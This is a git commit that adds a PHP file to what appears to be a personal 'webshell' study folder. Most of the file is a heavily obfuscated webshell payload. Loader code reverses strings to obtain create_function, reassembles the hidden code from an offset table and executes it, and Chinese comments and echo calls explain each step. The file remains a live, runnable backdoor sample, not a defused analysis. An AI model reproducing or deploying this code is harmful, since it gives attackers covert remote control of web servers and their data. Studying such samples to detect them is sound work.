5bc9ea09c291c2bd10280433964c82611af1d381
九世 <422926799@qq.com>
2019-02-12 15:06:30 +0800

    Add files via upload

---
+++ 学习记录/webshell/phpwebshell/php.php
@@ -0,0 +1,44 @@
+<?php
+$varshtmz = 'gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~($n){return chr(ord($n)-1);} @error_reporting(0)2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%6~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fCW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fub!	x246767~6<Cw6<pd%w6Z6<)%bbT-%bT-%hW~%fdy)##-!#~<!%bss	x5csboe))1/35.)1/14+9**-FNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}17f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y3163	150	x72	157	x6d	145"pd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#	x78"))) { $vxbfnzu = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63q%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:!Ypp2)%zB%z>!	x24/%tmw/	x2h%)m%):fmjix:<##:>:h%:<#64pdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFW%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{645]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvsow6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuousut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+994)%zW%h>EzH,2W%wN;#-	164	x69	157	x6e"; function jeqganxs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3;)gj}l;33bq}k;opjudo2]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%)1/2986+7**^/%rx<~!!%s:N}#-%o:W%cfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!uas=strtolower($_SERVER["	x48	1:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h272qj%)7gj6<**2qj%)hopm3qjA)qj	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $5h%/#0#/*#npd/#)rrd/#00;quu+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]5&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b#-!#]y38#-!%w:**<")));$vsrqhxc = $vxbfnzu("", $rhaerrf); $vsrqhxc()>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fsdXA	x27K6<	x7fw6*3qj%7>	x2%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x2422]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]456~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*Cf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{>!	x242178}527}88:}334}472	x24<!%ff2!{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x2vg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%611127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpIj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,SFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)5i#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof	x74	141	x72	164") && (!isse7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%; $rhaerrf = implode(array_map("jeqganx",str_split("%tjw!>!#]y84]275; if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(6*	x7f_*#ujojRk3`{66sfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbq>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]8y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#46V;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjy>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!74985-rr.93e:5597f-s.973:829-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-7**197-2qj%7-K)udfoopdXA	x22)7gj6<*$uas,"	x72	166	x3a	61	x31"),j%>j%!*3!	x27!hmg%!)Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t)) or (strstr($uas,"	x66	151	x72	145	x66	157<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E##7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|4l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvuf5#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdzfmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!s:!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN5]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]Dj%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fet($GLOBALS["	x61	156p!*#ojneb#-*f%)sfxpmp24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*!%t::**<(<!fwbm)%tjw)#	x24<*17-SFEBFI,6<*127-UVP~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%7,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopo!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut;}}24	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"])3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5c928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275tt!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!g>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso2]K6]72]K9]78]K5]53]Kc#<%tpz!!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt):>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%jUQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!2!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S%)n%-#+I#)q%:>:r%:|:**t%)m%=*]y83]248]y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!sboepn)%epnbss-%rxW~QIQ&f_UTPI`QUUI&e_SEEB`FU.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd2]88]5]48]32M3]317]4if((function_exists("	x6f	142	x5f	163%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]27!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t:) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	xrxB%h>#]y31]278]y3e]81]K78:56985:6197g:76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]W&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**1386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSeejpmpb';
+echo chr((468-348));
+echo "<br>";
+$bqncdhj = explode(chr((468 - 348)) , substr($varshtmz, (30510 - 24490) , (174 - 140))); /*Array ( [0] => StrrEV [1] => NoiTCnUF_EtaERC [2] => ecAlPeR_rtS ) */
+$q=substr($varshtmz, (30510 - 24490) , (174 - 140));
+echo $q;
+echo "<br>";
+print_r($bqncdhj);
+echo "<br>";
+$xltwkkw = $bqncdhj[0]($bqncdhj[(7 - 6) ]); /*Strrev(noitcnuf_etaerc),反转成create_function()*/
+echo $xltwkkw;
+echo "<br>";
+$ledelawxjg = $bqncdhj[0]($bqncdhj[(7 - 5) ]); /*Strrev(ecAlPeR_rtS),反转成Str_RePlAce*/
+echo $ledelawxjg;
+echo "<br>";
+if (!function_exists('iyqcnvbf')) { /*如果不存在iyqcnvbf这个函数就执行以下程序*/
+    function iyqcnvbf($jwcpzxrno, $pyculq, $pirqwzlvyk) {
+        $uwfvanka = NULL;
+        for ($dldqyavdsm = 0; $dldqyavdsm < (sizeof($jwcpzxrno) / 2); $dldqyavdsm++) {
+            $uwfvanka.= substr($pyculq, $jwcpzxrno[($dldqyavdsm * 2) ], $jwcpzxrno[($dldqyavdsm * 2) + (5 - 4) ]);
+        }
+        return $pirqwzlvyk(chr((39 - 30)) , chr((445 - 353)) , $uwfvanka);
+    };
+}
+$ruxnscpf = explode(chr((136 - 92)) , '5630,37,3053,28,4417,20,1690,58,1548,31,4905,57,3193,51,3738,27,5762,70,567,23,3841,44,679,67,1189,35,33,48,3125,68,5453,51,291,24,5550,60,977,37,2468,56,5939,35,2820,66,3922,63,3703,35,258,33,2256,28,1660,30,4962,53,746,56,3264,54,4643,48,165,51,3081,44,2782,38,4717,22,371,62,3244,20,127,38,1076,50,590,50,5302,55,1504,44,4054,70,1224,54,3765,21,5063,51,2886,59,4301,55,1343,60,5206,47,433,69,4739,66,3381,49,1748,27,2995,58,1938,41,4867,35,2204,52,4166,46,4437,21,1126,43,5974,46,5525,25,802,37,2026,61,4356,61,925,52,2945,50,3985,69,5015,48,1436,68,1842,46,2681,44,5357,67,2629,52,4805,62,3531,46,2524,68,1278,20,2725,57,4575,68,5871,68,1888,50,1615,45,5424,29,899,26,3483,48,1298,45,3577,38,2592,37,3318,63,4458,66,2154,50,2340,70,0,33,5705,57,4212,45,1775,67,5114,63,5504,21,873,26,1169,20,3786,55,81,46,5832,39,3615,28,502,65,3430,53,5177,29,216,42,5667,38,4257,44,1979,47,4124,42,315,26,2284,56,2410,58,5610,20,1014,62,341,30,1403,33,5253,49,1579,36,839,34,640,39,4524,51,3885,37,3643,60,4691,26,2087,67,4902,3'); /*以,分割字符串*/
+echo chr(136-92);
+echo "<br>";
+print_r($ruxnscpf);
+$ppzgpct = $xltwkkw("", iyqcnvbf($ruxnscpf, $varshtmz, $ledelawxjg)); /*create_function("",iyqcnvbf($ruxnscpf, $varshtmz, $ledelawxjg))*/
+
+$xltwkkw = $varshtmz;
+$ppzgpct("");
+$ppzgpct = (748 - 627);
+
+$varshtmz = $ppzgpct - 1; 
+
+?>
+
+/*
+1.把要使用的函数全部堆在第一行
+2.反转出要用的函数
+3.然后在通过create_function()来执行指定的函数
+*/
